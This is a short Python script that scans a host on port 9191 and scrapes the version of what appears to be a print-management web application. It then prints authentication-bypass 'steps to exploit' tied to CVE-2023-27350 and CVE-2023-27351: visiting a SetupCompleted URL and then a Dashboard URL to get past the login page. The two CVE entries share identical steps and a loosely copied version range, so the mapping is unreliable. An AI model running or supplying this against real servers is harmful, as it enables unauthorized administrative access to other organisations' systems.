import re
import requests
from bs4 import BeautifulSoup


def is_valid_ip(ip):
    """
    Check if a string is a valid IP address.
    """
    pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    return bool(pattern.match(ip))


def check_vulnerabilities(ip):
    """
    Check if a web application at the given IP address is vulnerable to known CVEs.
    """
    vulnerabilities = [
        {'cve': 'CVE-2023-27350', 'version_range': ((8, 0), (22, 0, 4)), 'steps': [
            f"Step 1: Visit this URL first in your browser: http://{ip}:9191/app?service=page/SetupCompleted",
            f"Step 2: Visit this URL in your browser to bypass the login page: http://{ip}:9191/app?service=page/Dashboard"
        ]},
        {'cve': 'CVE-2023-27351', 'version_range': ((10, 0), (25, 0, 0)), 'steps': [
            f"Step 1: Visit this URL first in your browser: http://{ip}:9191/app?service=page/SetupCompleted",
            f"Step 2: Visit this URL in your browser to bypass the login page: http://{ip}:9191/app?service=page/Dashboard"
        ]},
        # Add more vulnerabilities here
    ]
    
    if not is_valid_ip(ip):
        print('Invalid IP address')
        return
    
    url = f'http://{ip}:9191/app?service=page/SetupCompleted'
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f'Error connecting to {url}: {e}')
        return
    
    soup = BeautifulSoup(response.content, 'html.parser')
    text_div = soup.find('div', class_='text')
    product_span = text_div.find('span', class_='product')
    version_span = None
    
    for span in text_div.find_all('span'):
        version_match = re.match(r'^\d+\.\d+\.\d+$', span.text.strip())
        if version_match:
            version_span = span
            break
    
    if version_span is None:
        print('Could not find version number')
        return
    
    version_str = version_span.text.strip()
    print(f'Web application version: {version_str}')
    
    try:
        version_tuple = tuple(map(int, version_str.split('.')))
    except ValueError:
        print('Invalid version format')
        return
    
    found_vulnerabilities = []
    for vuln in vulnerabilities:
        if vuln['version_range'][0] <= version_tuple <= vuln['version_range'][1]:
            found_vulnerabilities.append(vuln)
    
    if len(found_vulnerabilities) == 0:
        print('Web application is not vulnerable to known CVEs')
    else:
        print(f'Found {len(found_vulnerabilities)} vulnerabilities:')
        for vuln in found_vulnerabilities:
            print(f"- {vuln['cve']}")
            print("  Steps to exploit:")
            for step in vuln['steps']:
                print(f"  - {step}")
